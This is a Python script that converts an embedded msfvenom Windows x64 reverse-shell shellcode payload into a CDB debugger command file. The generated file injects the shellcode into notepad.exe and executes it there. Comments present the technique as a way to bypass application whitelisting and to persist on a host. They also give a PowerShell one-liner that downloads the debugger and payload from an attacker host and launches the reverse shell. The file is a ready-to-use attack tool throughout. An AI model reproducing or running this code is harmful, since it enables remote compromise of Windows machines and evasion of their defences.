#!/usr/bin/python3

# The goal of this script is to take an msfvenom shellcode payload
# and transform it into the shellcode format that CDB.exe is expecting

# python3 this-script.py > /tmp/payload.wds

# On the target
# .\cdb.exe -pd -cf C:\temp\payload.wds -o notepad.exe 
# -pd tells the debugger to keep the process running after the debugger is stopped (with quit)
# -cf tells the debugger to execut the following commands from a file - this is the wds file that will be output from this script
# -o this is the process that the debugger will open / attach to

# cdb.exe is a portable executable, signed by Microsoft - copy to the endpoint 
# Potenetial for :
#	Application Whitelisting Bypass
#	Persitence mechanism

# Host cdb and the wds payload, then use this oneliner to establish the revshell
# $u = "http://10.30.1.17/";$f = "cdb.exe","gary.wds";$f | % {iwr -uri $u$_ -outf $env:TEMP\$_};sl $env:TEMP; .\cdb.exe -pd -cf .\gary.wds -o notepad.exe

# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.30.1.17 LPORT=8123 EXITFUNC=thread -f python

buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
buf += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
buf += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
buf += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
buf += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
buf += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
buf += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
buf += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
buf += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
buf += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
buf += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32"
buf += b"\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec"
buf += b"\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x1f\xbb"
buf += b"\xac\x19\x99\xac\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41"
buf += b"\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01"
buf += b"\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50"
buf += b"\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48"
buf += b"\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
buf += b"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
buf += b"\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02"
buf += b"\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41"
buf += b"\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a"
buf += b"\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
buf += b"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50"
buf += b"\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
buf += b"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86"
buf += b"\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08"
buf += b"\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6"
buf += b"\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a"
buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59"
buf += b"\x41\x89\xda\xff\xd5"

BufferLength = len(buf)
BufferCounter = 0
ColumnCounter = 0
MemoryCounter = 0
writedata = ""

# Allocates RWX memory space inside of the process attached to the debugger
PrefixLine = ".foreach /pS 5 ( register { .dvalloc " + str(BufferLength) + " } ) { r @$t0 = register }"
print(PrefixLine)

# Reads each nibble from the buffer and write it into the WDS script format
while BufferCounter < BufferLength:
	nibble = buf[BufferCounter]
	cleanedhex = format(nibble, '02x')
	MemoryPosition = hex(MemoryCounter)[2:].zfill(2).upper()
	writedata = writedata + ";eb @$t0+" + str(MemoryPosition) + " " + str(cleanedhex).upper()
	BufferCounter += 1
	MemoryCounter += 1
	ColumnCounter +=1
	if ColumnCounter == 4:
		print(writedata)
		writedata = ""
		ColumnCounter = 0

#Print suffix lines for setting Instruction Pointer location

PointerLocation = "r @$ip=@$t0"
Go = "g"
Quit = "q"

#Moves the Instruction Pointer to our shellcode location
print(PointerLocation)

# Tells the debugger to continue execution, which begins our shellcode
print(Go)

# Quits the debugger - If you're using -pd in the command line execution of cdb.exe, the shell should stay open
print(Quit)

